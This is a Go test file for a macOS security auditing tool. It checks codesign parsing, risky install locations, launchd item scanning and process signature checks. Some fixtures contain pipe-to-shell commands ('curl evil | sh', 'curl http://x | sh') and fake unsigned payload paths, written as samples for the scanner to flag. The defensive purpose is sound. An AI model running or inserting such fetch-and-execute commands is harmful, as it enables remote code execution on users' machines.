package runner

import (
	"context"
	"errors"
	"os"
	"strings"
	"sync"
	"testing"

	"github.com/jimididit/mac-compass/internal/catalog"
)

const appleCodesign = `Executable=/usr/libexec/foo
Identifier=com.apple.foo
Format=Mach-O universal (x86_64 arm64e)
CodeDirectory v=20400 size=1000 flags=0x0(none) hashes=20+2 location=embedded
Platform identifier=15
Signature size=4442
Authority=Software Signing
Authority=Apple Code Signing Certification Authority
Authority=Apple Root CA
TeamIdentifier=not set`

// macOS 26 names the leaf of Apple's platform chain "macOS Software Signing".
const tahoeAppleCodesign = `Executable=/bin/launchctl
Identifier=com.apple.xpc.launchctl
Format=Mach-O universal (x86_64 arm64e)
Authority=macOS Software Signing
Authority=Apple Code Signing Certification Authority
Authority=Apple Root CA
TeamIdentifier=not set`

const devIDCodesign = `Executable=/Library/Foo/foo
Identifier=com.foo.agent
CodeDirectory v=20500 size=900 flags=0x10000(runtime) hashes=20+2 location=embedded
Authority=Developer ID Application: Foo Inc (ABCDE12345)
Authority=Developer ID Certification Authority
Authority=Apple Root CA
TeamIdentifier=ABCDE12345`

const adhocCodesign = `Executable=/tmp/x
Identifier=x
CodeDirectory v=20400 size=300 flags=0x20002(adhoc,linker-signed) hashes=5+0 location=embedded
Signature=adhoc
TeamIdentifier=not set`

func TestParseCodesign(t *testing.T) {
	cases := []struct {
		name  string
		out   string
		code  int
		state string
		team  string
	}{
		{"apple platform", appleCodesign, 0, "apple", "-"},
		{"apple platform, macOS 26 leaf name", tahoeAppleCodesign, 0, "apple", "-"},
		{"developer id", devIDCodesign, 0, "developer-id", "ABCDE12345"},
		{"adhoc", adhocCodesign, 0, "adhoc", "-"},
		{"unsigned", "/tmp/y: code object is not signed at all", 1, "unsigned", "-"},
		{"other cert", "Identifier=x\nAuthority=Apple Development: me@example.com (XYZ)\nAuthority=Apple Worldwide Developer Relations Certification Authority\nAuthority=Apple Root CA\nTeamIdentifier=XYZ1234567", 0, "other-signed", "XYZ1234567"},
		{"unreadable", "something odd", 2, "unreadable", "-"},
	}
	for _, c := range cases {
		got := parseCodesign(c.out, c.code)
		if got.State != c.state || got.Team != c.team {
			t.Errorf("%s: got %+v; want state=%s team=%s", c.name, got, c.state, c.team)
		}
	}
	if s := parseCodesign(devIDCodesign, 0).Signer; !strings.HasPrefix(s, "Developer ID Application: Foo Inc") {
		t.Errorf("signer = %q", s)
	}
}

func TestRiskyLocation(t *testing.T) {
	cases := map[string]string{
		"/usr/libexec/foo":                      "",
		"/Library/Foo/bin/foo":                  "",
		"/tmp/x":                                "temp-location",
		"/private/var/tmp/x":                    "temp-location",
		"/var/folders/ab/cd/T/x":                "temp-location",
		"/Users/Shared/x":                       "temp-location",
		"/Users/me/.hidden/agent":               "hidden-location",
		"/Library/Application Support/.cache/x": "hidden-location",
		"/Users/me/Library/foo/..":              "",
	}
	for in, want := range cases {
		if got := riskyLocation(in); got != want {
			t.Errorf("riskyLocation(%q) = %q; want %q", in, got, want)
		}
	}
}

func TestScriptArg(t *testing.T) {
	cases := []struct {
		args []string
		want string
	}{
		{[]string{"/bin/sh", "/Library/Foo/run.sh"}, "/Library/Foo/run.sh"},
		{[]string{"/bin/bash", "-x", "/opt/run.sh", "arg"}, "/opt/run.sh"},
		{[]string{"/bin/sh", "-c", "curl evil | sh"}, ""},
		{[]string{"/usr/bin/python3"}, ""},
		{[]string{"/bin/sh", "relative.sh"}, ""},
	}
	for _, c := range cases {
		if got := scriptArg(c.args); got != c.want {
			t.Errorf("scriptArg(%v) = %q; want %q", c.args, got, c.want)
		}
	}
}

// fakeSystem builds deps backed by in-memory plists and signing results.
type fakeSystem struct {
	mu      sync.Mutex
	dirs    map[string][]string  // dir -> file names
	plists  map[string]string    // plist path -> JSON
	sign    map[string][2]string // target -> codesign output, spctl output
	exists  map[string]bool
	scripts map[string]bool // files that start with a shebang
	calls   map[string]int
}

func (f *fakeSystem) deps(home string) deps {
	return deps{
		home: home,
		listDir: func(dir string) ([]string, error) {
			if n, ok := f.dirs[dir]; ok {
				return n, nil
			}
			return nil, os.ErrNotExist
		},
		exists: func(p string) bool { return f.exists[p] },
		readHead: func(p string, n int) ([]byte, error) {
			if f.scripts[p] {
				return []byte("#!"), nil
			}
			return []byte{0xcf, 0xfa}, nil
		},
		exec: func(ctx context.Context, argv ...string) (string, string, int, error) {
			switch argv[0] {
			case "/usr/bin/plutil":
				path := argv[len(argv)-1]
				j, ok := f.plists[path]
				if !ok {
					return "", "no such file", 1, nil
				}
				return j, "", 0, nil
			case "/usr/bin/codesign":
				t := argv[len(argv)-1]
				if argv[1] == "--verify" { // notarization requirement check
					if f.sign[t][1] == "notarized" {
						return "", "", 0, nil
					}
					return "", t + ": does not satisfy its designated Requirement", 3, nil
				}
				f.mu.Lock()
				f.calls[t]++
				f.mu.Unlock()
				out := f.sign[t][0]
				if strings.Contains(out, "not signed at all") {
					return "", out, 1, nil
				}
				return "", out, 0, nil
			}
			return "", "", 0, errors.New("unexpected command " + argv[0])
		},
	}
}

func TestLaunchdTargets(t *testing.T) {
	f := &fakeSystem{
		calls: map[string]int{},
		dirs: map[string][]string{
			"/Library/LaunchDaemons":         {"com.good.plist", "com.evil.plist", "com.gone.plist", "readme.txt", "com.script.plist", "com.shebang.plist", "com.apple2.plist"},
			"/Library/LaunchAgents":          {"com.good2.plist"},
			"/Users/me/Library/LaunchAgents": {"com.adhoc.plist"},
		},
		plists: map[string]string{
			"/Library/LaunchDaemons/com.good.plist":          `{"Label":"com.good","ProgramArguments":["/Library/Foo/foo","--daemon"],"RunAtLoad":true,"KeepAlive":true}`,
			"/Library/LaunchDaemons/com.evil.plist":          `{"Label":"com.evil","Program":"/tmp/.x/payload","RunAtLoad":true}`,
			"/Library/LaunchDaemons/com.gone.plist":          `{"Label":"com.gone","ProgramArguments":["/opt/removed/app"]}`,
			"/Library/LaunchDaemons/com.script.plist":        `{"Label":"com.script","ProgramArguments":["/bin/sh","-c","curl http://x | sh"],"KeepAlive":{"SuccessfulExit":false}}`,
			"/Library/LaunchDaemons/com.shebang.plist":       `{"Label":"com.shebang","Program":"/usr/local/bin/run.sh","RunAtLoad":true}`,
			"/Library/LaunchDaemons/com.apple2.plist":        `{"Label":"com.apple2","ProgramArguments":["/bin/launchctl","load"]}`,
			"/Library/LaunchAgents/com.good2.plist":          `{"Label":"com.good2","ProgramArguments":["/Library/Foo/foo"]}`,
			"/Users/me/Library/LaunchAgents/com.adhoc.plist": `{"Label":"com.adhoc","ProgramArguments":["/Users/me/bin/tool"]}`,
		},
		scripts: map[string]bool{"/usr/local/bin/run.sh": true},
		exists:  map[string]bool{"/usr/local/bin/run.sh": true, "/bin/launchctl": true, "/bin/sh": true, "/Library/Foo/foo": true, "/tmp/.x/payload": true, "/Users/me/bin/tool": true},
		sign: map[string][2]string{
			"/Library/Foo/foo":   {devIDCodesign, "notarized"},
			"/tmp/.x/payload":    {"/tmp/.x/payload: code object is not signed at all", ""},
			"/Users/me/bin/tool": {adhocCodesign, ""},
			"/bin/launchctl":     {tahoeAppleCodesign, ""},
		},
	}
	out, err := launchdTargets(context.Background(), f.deps("/Users/me"))
	if err != nil {
		t.Fatal(err)
	}
	rows := strings.Split(strings.TrimSpace(out), "\n")
	if rows[0] != LaunchdHeader {
		t.Fatalf("header = %q", rows[0])
	}
	byLabel := map[string][]string{}
	for _, r := range rows[1:] {
		c := strings.Split(r, "\t")
		if len(c) != 9 {
			t.Fatalf("row has %d columns: %q", len(c), r)
		}
		byLabel[c[1]] = c
	}
	if len(byLabel) != 8 {
		t.Fatalf("want 8 items (readme.txt ignored), got %d: %v", len(byLabel), byLabel)
	}
	col := func(label string, i int) string { return byLabel[label][i] }
	// columns: kind label plist target state team signer notarization flags
	if col("com.good", 4) != "developer-id" || col("com.good", 5) != "ABCDE12345" || col("com.good", 7) != "notarized" || col("com.good", 8) != "runatload,keepalive" {
		t.Errorf("good item: %v", byLabel["com.good"])
	}
	if col("com.evil", 4) != "unsigned" || !strings.Contains(col("com.evil", 8), "hidden-location") && !strings.Contains(col("com.evil", 8), "temp-location") {
		t.Errorf("evil item: %v", byLabel["com.evil"])
	}
	if col("com.gone", 4) != "missing" {
		t.Errorf("missing item: %v", byLabel["com.gone"])
	}
	if col("com.script", 4) != "script" || !strings.Contains(col("com.script", 8), "inline-command") || !strings.Contains(col("com.script", 8), "keepalive") {
		t.Errorf("script item: %v", byLabel["com.script"])
	}
	if col("com.adhoc", 0) != "user-agent" || col("com.adhoc", 4) != "adhoc" {
		t.Errorf("adhoc item: %v", byLabel["com.adhoc"])
	}
	if col("com.shebang", 4) != "script" || !strings.Contains(col("com.shebang", 8), "shebang") {
		t.Errorf("a script run directly must be a script, not an unsigned program: %v", byLabel["com.shebang"])
	}
	if col("com.apple2", 4) != "apple" || col("com.apple2", 7) != "apple" {
		t.Errorf("Apple platform tools must be recognised: %v", byLabel["com.apple2"])
	}
	if f.calls["/Library/Foo/foo"] != 1 {
		t.Errorf("a program shared by two items must be inspected once, got %d", f.calls["/Library/Foo/foo"])
	}
}

func TestLaunchdTargets_UnreadablePlistAndTimeout(t *testing.T) {
	f := &fakeSystem{calls: map[string]int{}, dirs: map[string][]string{"/Library/LaunchDaemons": {"bad.plist"}}}
	out, err := launchdTargets(context.Background(), f.deps(""))
	if err != nil || !strings.Contains(out, "unreadable") {
		t.Errorf("unreadable plist should be a row, not an error: %q %v", out, err)
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := launchdTargets(ctx, f.deps("")); err == nil {
		t.Error("a cancelled context must stop the scan")
	}
}

func TestEveryKnownBuiltinIsImplemented(t *testing.T) {
	for _, name := range catalog.KnownBuiltins {
		if _, ok := builtins[name]; !ok {
			t.Errorf("builtin %q is listed in the catalog but not implemented", name)
		}
	}
	if len(builtins) != len(catalog.KnownBuiltins) {
		t.Errorf("builtins (%d) and catalog.KnownBuiltins (%d) differ", len(builtins), len(catalog.KnownBuiltins))
	}
}

func TestParseProcessList(t *testing.T) {
	out := `root     /sbin/launchd
root     /usr/libexec/xpcproxy
me       /Applications/Google Chrome.app/Contents/MacOS/Google Chrome
me       /Applications/Google Chrome.app/Contents/MacOS/Google Chrome
me       -zsh
root     (sd-pam)
_windowserver /System/Library/PrivateFrameworks/SkyLight.framework/Resources/WindowServer
`
	got := parseProcessList(out)
	if len(got) != 4 {
		t.Fatalf("want 4 absolute-path programs, got %d: %+v", len(got), got)
	}
	chrome := got["/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"]
	if chrome.count != 2 || chrome.userList() != "me" {
		t.Errorf("paths with spaces must group: %+v", chrome)
	}
	if got["/sbin/launchd"].userList() != "root" {
		t.Errorf("users: %+v", got["/sbin/launchd"])
	}
}

func TestProcessSignatures(t *testing.T) {
	f := &fakeSystem{
		calls:  map[string]int{},
		exists: map[string]bool{"/sbin/launchd": true, "/tmp/.evil": true, "/Users/me/tool": true, "/Applications/Foo.app/Contents/MacOS/Foo": true},
		sign: map[string][2]string{
			"/sbin/launchd":  {tahoeAppleCodesign, ""},
			"/tmp/.evil":     {"/tmp/.evil: code object is not signed at all", ""},
			"/Users/me/tool": {adhocCodesign, ""},
			"/Applications/Foo.app/Contents/MacOS/Foo": {devIDCodesign, "notarized"},
		},
	}
	dd := f.deps("/Users/me")
	inner := dd.exec
	dd.exec = func(ctx context.Context, argv ...string) (string, string, int, error) {
		if argv[0] == "/bin/ps" {
			return "root /sbin/launchd\nme /tmp/.evil\nroot /Users/me/tool\nme /Applications/Foo.app/Contents/MacOS/Foo\nme /opt/deleted/app\nme -zsh\n", "", 0, nil
		}
		return inner(ctx, argv...)
	}
	out, err := processSignatures(context.Background(), dd)
	if err != nil {
		t.Fatal(err)
	}
	rows := strings.Split(strings.TrimSpace(out), "\n")
	if rows[0] != ProcessHeader {
		t.Fatalf("header = %q", rows[0])
	}
	by := map[string][]string{}
	for _, r := range rows[1:] {
		c := strings.Split(r, "\t")
		if len(c) != 8 {
			t.Fatalf("row has %d columns: %q", len(c), r)
		}
		by[c[1]] = c
	}
	// columns: users path count state team signer notarization flags
	if by["/sbin/launchd"][3] != "apple" {
		t.Errorf("launchd: %v", by["/sbin/launchd"])
	}
	if by["/tmp/.evil"][3] != "unsigned" || !strings.Contains(by["/tmp/.evil"][7], "temp-location") {
		t.Errorf("evil: %v", by["/tmp/.evil"])
	}
	if by["/Users/me/tool"][3] != "adhoc" || !strings.Contains(by["/Users/me/tool"][7], "root-from-user-dir") {
		t.Errorf("root from user dir: %v", by["/Users/me/tool"])
	}
	if by["/Applications/Foo.app/Contents/MacOS/Foo"][6] != "notarized" {
		t.Errorf("foo: %v", by["/Applications/Foo.app/Contents/MacOS/Foo"])
	}
	if by["/opt/deleted/app"][3] != "missing" {
		t.Errorf("a running program whose file is gone: %v", by["/opt/deleted/app"])
	}
	if _, ok := by["-zsh"]; ok {
		t.Error("login shells must not appear")
	}
}

func TestProcessSignatures_PsFailure(t *testing.T) {
	d := deps{exec: func(ctx context.Context, argv ...string) (string, string, int, error) { return "", "boom", 1, nil }}
	if _, err := processSignatures(context.Background(), d); err == nil {
		t.Error("a failing ps must be an error, not an empty success")
	}
}
